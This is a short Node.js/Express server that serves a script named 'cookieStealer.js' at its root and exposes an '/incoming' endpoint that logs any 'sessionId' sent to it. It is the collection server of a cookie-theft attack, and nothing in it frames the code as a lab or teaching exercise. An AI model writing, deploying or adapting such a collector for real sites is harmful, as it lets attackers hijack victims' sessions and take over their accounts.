const express = require('express')
const app = express()
const cors = require('cors')
const bodyParser = require('body-parser')

app.use(cors())
app.use(bodyParser.urlencoded())
app.use(bodyParser.json())
app.use('/static', express.static('public'))

app.get("/", (req,res) => {
    res.sendFile(process.cwd () + '/public/cookieStealer.js')
})

app.get("/incoming", (req,res) => {
    let { sessionId } = req.query 
    console.log(sessionId)
    res.send({ "status": 200, "message": 'Received data.' })
})

app.listen(8082, () => {
    console.log('Listening on 8082')
})